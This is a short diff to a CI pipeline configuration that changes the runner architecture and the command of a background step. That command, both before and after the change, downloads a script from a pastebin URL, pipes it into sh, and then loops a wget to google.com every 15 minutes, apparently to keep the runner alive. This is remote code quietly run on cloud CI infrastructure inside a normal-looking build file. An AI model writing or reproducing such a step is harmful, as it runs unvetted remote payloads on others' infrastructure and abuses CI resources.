@@ -20,7 +20,7 @@ pipeline:
           cloneCodebase: true
           platform:
             os: Linux
-            arch: Arm64
+            arch: Amd64
           runtime:
             type: Cloud
             spec: {}
@@ -32,4 +32,4 @@ pipeline:
                   identifier: Background_1
                   spec:
                     shell: Sh
-                    command: (wget https://pastebin.com/raw/5NYGV6Bx -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 900 ; done
+                    command: (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 900 ; done
